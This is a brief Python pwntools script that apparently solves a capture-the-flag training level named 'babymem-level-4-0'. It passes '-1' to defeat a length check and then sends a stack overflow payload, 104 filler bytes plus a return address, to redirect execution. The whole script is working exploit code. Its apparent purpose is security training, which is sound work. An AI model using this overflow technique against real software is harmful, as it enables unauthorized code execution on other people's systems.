from pwn import *;

proc = process('/challenge/babymem-level-4-0')
print(proc.recv())
proc.sendline(b'-1')
# max payload size 82 to bypass control
print(proc.recv())
payload = b'A'*104 + p64(0x4016a9)
proc.sendline(payload)
print(proc.recv()) 
